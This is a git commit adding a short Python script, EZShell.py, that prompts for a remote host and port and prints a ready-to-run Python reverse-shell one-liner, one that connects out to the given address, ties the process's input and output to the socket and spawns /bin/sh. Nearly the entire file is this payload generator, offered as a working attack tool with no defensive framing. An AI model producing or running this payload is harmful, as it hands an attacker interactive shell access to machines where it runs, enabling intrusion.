0d8f69387783f612d44323a65e5e191bde542c5e
Shx-rp <45079643+Shx-rp@users.noreply.github.com>
2022-11-01 11:39:34 +0000

    Add files via upload

---
+++ EZShell.py
@@ -0,0 +1,25 @@
+#!/usr/bin/env python3
+import os
+
+def menu():
+    print('''
+    ________MENU_________
+    \n1. Python3 \n2. WIP
+          ''')
+
+def main():
+    os.system("clear")
+
+    menu()
+    selectShell = int(input("Select Number:"))
+    
+    if selectShell == 1:
+        rhost = input("RHOST= ")
+        port = input("PORT= ")
+        print("""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""".format(rhost, port))
+    else:
+        menu()
+        main()
+
+if __name__ == "__main__":
+    main()
